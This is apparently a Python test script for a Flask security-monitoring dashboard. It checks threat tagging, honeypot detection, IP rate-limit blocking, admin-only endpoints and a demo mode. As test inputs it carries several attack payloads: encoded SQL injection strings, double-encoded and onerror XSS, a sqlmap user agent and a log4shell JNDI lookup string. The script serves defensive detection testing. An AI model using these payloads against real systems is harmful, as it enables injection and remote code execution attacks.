import importlib, sys, time, json, os, tempfile
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
os.environ.setdefault("SOC_DATA_DIR", tempfile.mkdtemp())
_real_sleep = time.sleep
from unittest import mock
mod = importlib.import_module(sys.argv[1] if len(sys.argv) > 1 else "soc_dashboard")
app = mod.app
c = app.test_client()
fails = []
def check(name, cond, info=""):
    print(("PASS " if cond else "FAIL ") + name, info if not cond else "")
    if not cond: fails.append(name)

# block network: geo lookups must fail gracefully
with mock.patch.object(mod._requests, "get", side_effect=OSError("no network")):
    PUB = {"REMOTE_ADDR": "8.8.4.4"}
    CH = {"User-Agent": "Mozilla/5.0 Chrome/129"}
    r = c.get("/log?page=home", headers=CH); j = r.json
    check("benign localhost is info, no tags", j["severity"] == "info" and j["threat_tags"] == [], j)
    r = c.get("/log", headers={**CH, "Referer": "https://www.google.com/"})
    check("google.com referrer not malware", r.json["threat_tags"] == [], r.json)
    r = c.post("/log", json={"payload": {"page": "/pricing"}}, headers=CH)
    check("benign JSON 'payload' not flagged", r.json["threat_tags"] == [], r.json)
    r = c.get("/log?id=1%27%20or%20%271%27%3D%271", headers=CH)
    check("encoded SQLi detected", "EXPLOIT" in r.json["threat_tags"], r.json)
    r = c.get("/log?q=%253Cscript%253Ealert(1)", headers=CH)
    check("double-encoded XSS detected", "EXPLOIT" in r.json["threat_tags"], r.json)
    r = c.get("/log?id=1%20UNION%20SELECT%20pass", headers={"User-Agent": "sqlmap/1.8"}, environ_base=PUB)
    check("SQLi+sqlmap => high/critical", r.json["severity"] in ("high", "critical"), r.json)
    r = c.get("/log", headers={"User-Agent": "${jndi:ldap://x/a}"}, environ_base={"REMOTE_ADDR": "8.8.4.5"})
    check("log4shell in UA detected", "EXPLOIT" in r.json["threat_tags"], r.json)
    r = c.get("/wp-login.php", headers=CH, environ_base={"REMOTE_ADDR": "8.8.4.6"})
    check("honeypot returns 404", r.status_code == 404)
    e = [x for x in mod.logs if x["path"] == "/wp-login.php"][-1]
    check("honeypot tagged", "HONEYPOT" in e["threat_tags"], e["threat_tags"])
    c.get("/administratorz", headers=CH)
    e = mod.logs[-1]; check("no honeypot FP on /administratorz", "HONEYPOT" not in e["threat_tags"], e["threat_tags"])
    c.get("/log?f=setup.exe", headers=CH); check(".exe flagged", "MALWARE_DELIVERY" in mod.logs[-1]["threat_tags"])
    c.get("/log?site=example.com", headers=CH); check(".com not flagged", mod.logs[-1]["threat_tags"] == [], mod.logs[-1]["threat_tags"])
    check("private IP geo risk 0, no lookup crash", mod.logs[-1]["geo_risk"] == 0 and mod.logs[-1]["cc"] == "LAN")
    # rate limit + dedup
    ip = {"REMOTE_ADDR": "8.8.8.8"}
    codes = [c.get("/log", headers=CH, environ_base=ip).status_code for _ in range(35)]
    check("auto-block after 30 then 403", codes[28] == 200 and codes[30] == 403, codes[25:33])
    ab = [a for a in mod.alerts if a["ip"] == "8.8.8.8" and a["category"] == "RATE_LIMIT" and "Auto" in a["reason"]]
    check("exactly one auto-block alert", len(ab) == 1, len(ab))
    # admin guard
    r = c.post("/api/block", json={"ip": "1.2.3.4"}, environ_base=PUB)
    check("public client cannot block", r.status_code == 403, r.status_code)
    r = c.post("/api/unblock", json={"ip": "8.8.8.8"})
    check("localhost can unblock", r.status_code == 200, r.json)
    r = c.get("/log", headers=CH, environ_base=ip)
    check("unblocked IP not immediately re-blocked", r.status_code == 200, r.status_code)
    r = c.post("/api/block", json={"ip": "1.2.3.4", "reason": "<img src=x onerror=alert(1)>"})
    check("block stores reason (escaped client-side)", r.status_code == 200)
    r = c.post("/api/block", json={"ip": "not-an-ip"}); check("invalid IP rejected", r.status_code == 400)
    # id polling survives > 1000 alerts
    for i in range(1100):
        mod.emit_alert(f"10.9.{i//250}.{i%250}", "x", "flood", "low", "TEST", 5)
    last = mod.alerts[-1]["id"]
    r = c.get(f"/api/alerts?after_id={last-3}"); check("after_id polling past 1000 alerts", len(r.json) == 3, len(r.json))
    for p in ["/api/stats", "/api/threat-stats", "/api/blocklist", "/api/health", "/api/logs?after_id=0"]:
        r = c.get(p); check(f"{p} 200", r.status_code == 200, r.status_code)
    st = c.get("/api/stats").json
    check("stats shape", all(k in st for k in ("severity", "categories", "top_sources", "rules")), list(st))
    r = c.get("/"); check("dashboard serves html", r.status_code == 200 and b"<html" in r.data)
    # demo
    mod.RATE_BLOCK_LIMIT_ORIG = mod.RATE_BLOCK_LIMIT
    with mock.patch.object(mod.time, "sleep", lambda s: None):
        n0 = mod._counters["events"]; r = c.post("/api/demo"); check("demo starts", r.status_code == 200, r.json)
        for _ in range(100):
            if not mod._demo_running.is_set(): break
            _real_sleep(0.05)
    check("demo produced events", mod._counters["events"] - n0 >= 40, mod._counters["events"] - n0)
    check("demo auto-blocked brute-forcer", "203.0.113.24" in mod.BLOCKLIST)
    sevs = {e["severity"] for e in mod.logs if e.get("geo_source") == "demo"}
    check("demo spans severities", {"critical", "info"} <= sevs, sevs)
print(f"\n{len(fails)} failures", fails, "| rules:", mod.RULE_COUNT)
sys.exit(1 if fails else 0)
